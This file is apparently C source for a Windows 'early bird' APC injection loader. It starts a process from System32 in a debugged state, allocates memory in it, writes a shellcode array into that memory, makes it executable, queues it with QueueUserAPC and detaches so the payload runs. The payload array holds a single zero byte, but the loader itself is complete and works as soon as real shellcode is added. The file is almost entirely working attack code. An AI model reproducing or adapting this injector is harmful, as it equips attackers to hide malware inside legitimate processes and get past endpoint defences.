#include <Windows.h>
#include <stdio.h>

#pragma warning (disable:4996)

// Define the payload here
unsigned char Payload[] = { 0x00 };

// Function to create a process in a debugged state
BOOL CreateProcess(LPCSTR lpProcessName, DWORD* dwProcessID, HANDLE* hVictimProcess, HANDLE* hThread)
{
    CHAR lpTargetPath[MAX_PATH * 2];
    CHAR WinDir[MAX_PATH];

    STARTUPINFOA            Si = { 0 };
    PROCESS_INFORMATION     Pi = { 0 };

    // Cleaning the structs 
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    Si.cb = sizeof(STARTUPINFOA);

    // Getting the %WINDIR% environment variable path (usually 'C:\Windows')
    if (!GetEnvironmentVariableA("WINDIR", WinDir, MAX_PATH)) {
        printf("[-] Error: Failed to retrieve system directory. Please ensure that your environment is set up correctly.\n");
        return FALSE;
    }

    // Creating the target process path 
    sprintf(lpTargetPath, "%s\\System32\\%s", WinDir, lpProcessName);
    printf("\n\t[i] Launching: \"%s\" ... ", lpTargetPath);

    // Create the process
    if (!CreateProcessA(
        NULL,
        lpTargetPath,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &Si,
        &Pi))
    {
        printf("[-] Error: Failed to create process. Please ensure that the specified process exists and you have appropriate permissions.\n");
        return FALSE;
    }

    printf("[+] Process launched successfully.\n");

    // Store the process ID, process handle, and thread handle
    *dwProcessID = Pi.dwProcessId;
    *hVictimProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Check if the necessary handles are valid
    if (*dwProcessID != NULL && *hVictimProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

// Function to inject shellcode into a remote process
BOOL InjectShellcodeToRemoteProcess(HANDLE hVictimProcess, PBYTE pPayload, SIZE_T sPayloadSize, PVOID* ppAddress)
{
    SIZE_T  sNumBytesWritten = NULL;
    DWORD   dwOldProtection = NULL;

    // Allocate memory in the target process
    *ppAddress = VirtualAllocEx(hVictimProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[-] Error: Failed to allocate memory in the victim process. Please ensure that the process is running and you have appropriate permissions.\n");
        return FALSE;
    }
    printf("\n\t[i] Allocated memory at: 0x%p \n", *ppAddress);

    // Write the shellcode to the allocated memory
    printf("\t[*] Press Enter To Write Payload to the process ... ");
    getchar();
    if (!WriteProcessMemory(hVictimProcess, *ppAddress, pPayload, sPayloadSize, &sNumBytesWritten) || sNumBytesWritten != sPayloadSize) {
        printf("\n\t[-] Error: Failed to write shellcode to the victim process. Please ensure that the process is running and you have appropriate permissions.\n");
        return FALSE;
    }
    printf("\t[i] Successfully written %d bytes of shellcode.\n", sNumBytesWritten);

    // Change memory protection to allow execution
    if (!VirtualProtectEx(hVictimProcess, *ppAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[-] Error: Failed to change memory protection in the victim process. Please ensure that the process is running and you have appropriate permissions.\n");
        return FALSE;
    }

    return TRUE;
}

int main() {
    HANDLE hVictimProcess = NULL, hThread = NULL;
    PVOID pAddress = NULL;
    DWORD dwProcessID = NULL;

    // Create the target process in a debugged state
    printf("[i] Creating \"%s\" Process As A Debugged Process ... ", "VictimProcess.exe");
    if (!CreateProcess("VictimProcess.exe", &dwProcessID, &hVictimProcess, &hThread)) {
        printf("[-] Error: Failed to launch the target process.\n");
        return -1;
    }
    printf("\t[i] Target process created with PID: %d \n", dwProcessID);
    printf("[+] Process launched successfully.\n\n");

    // Inject the payload into the target process
    printf("[i] Writing Shellcode To The Target Process ... ");
    if (!InjectShellcodeToRemoteProcess(hVictimProcess, Payload, sizeof(Payload), &pAddress)) {
        printf("[-] Error: Failed to inject shellcode into the target process.\n");
        CloseHandle(hVictimProcess);
        CloseHandle(hThread);
        return -1;
    }
    printf("[+] Shellcode injected successfully.\n\n");

    // Queue the shellcode for execution using an APC
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("[-] Error: Failed to queue APC for execution.\n");
        CloseHandle(hVictimProcess);
        CloseHandle(hThread);
        return -1;
    }

    // Wait for user input to execute the shellcode
    printf("[*] Press Enter To Run Shellcode ... ");
    getchar();

    // Detach the target process
    printf("[i] Detaching The Target Process ... ");
    if (!DebugActiveProcessStop(dwProcessID)) {
        printf("[-] Error: Failed to detach the target process.\n");
        CloseHandle(hVictimProcess);
        CloseHandle(hThread);
        return -1;
    }
    printf("[+] Process detached successfully.\n\n");

    // Wait for user input to quit the program
    printf("[*] Press Enter To Quit ... ");
    getchar();
    CloseHandle(hVictimProcess);
    CloseHandle(hThread);

    return 0;
}
